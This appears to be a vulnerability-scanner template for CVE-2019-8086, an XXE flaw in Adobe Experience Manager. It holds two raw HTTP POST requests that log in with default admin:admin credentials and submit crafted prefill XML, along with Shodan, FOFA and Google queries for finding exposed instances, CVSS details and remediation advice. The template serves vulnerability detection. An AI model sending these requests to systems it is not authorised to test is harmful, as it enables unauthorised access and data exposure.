http:
- matchers:
  - part: body
    type: word
    words:
    - <afData>ABC<afBoundData/>
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /content/{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Authorization: Basic YWRtaW46YWRtaW4=

    Referer: {{BaseURL}}


    sling:resourceType=fd/af/components/guideContainer

    '
  - 'POST /content/{{randstr}}.af.internalsubmit.json HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Authorization: Basic YWRtaW46YWRtaW4=

    Referer: {{BaseURL}}


    guideState={"guideState"%3a{"guideDom"%3a{},"guideContext"%3a{"xsdRef"%3a"","guidePrefillXml"%3a"<afData>\u0041\u0042\u0043</afData>"}}}

    '
id: CVE-2019-8086
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:adobe:experience_manager:6.2:*:*:*:*:*:*:*
    cve-id: CVE-2019-8086
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-611
    epss-percentile: 0.97932
    epss-score: 0.54798
  description: Adobe Experience Manager 6.5, 6.4, 6.3 and 6.2 are susceptible to XML
    external entity injection. An attacker can possibly obtain sensitive information,
    modify data, and/or execute unauthorized administrative operations in the context
    of the affected site.
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access to sensitive information, server-side request forgery, and potential remote
    code execution.

    '
  metadata:
    fofa-query: title="aem sign in"
    google-query: intitle:"aem sign in"
    max-request: 2
    product: experience_manager
    shodan-query:
    - http.title:"AEM Sign In"
    - http.component:"Adobe Experience Manager"
    - http.component:"adobe experience manager"
    - http.title:"aem sign in"
    - cpe:"cpe:2.3:a:adobe:experience_manager"
    vendor: adobe
  name: Adobe Experience Manager - XML External Entity Injection
  reference:
  - https://speakerdeck.com/0ang3el/a-hackers-perspective-on-aem-applications-security?slide=13
  - https://github.com/0ang3el/aem-hacker/blob/master/aem_hacker.py
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-8086
  - https://nvd.nist.gov/vuln/detail/CVE-2019-8086
  - https://helpx.adobe.com/security/products/experience-manager/apsb19-48.html
  remediation: 'Apply the necessary security patches provided by Adobe to mitigate
    the vulnerability. Additionally, ensure that the server is properly configured
    to restrict access to sensitive files and prevent XXE attacks.

    '
  severity: high
  tags: cve,cve2019,aem,adobe,vuln
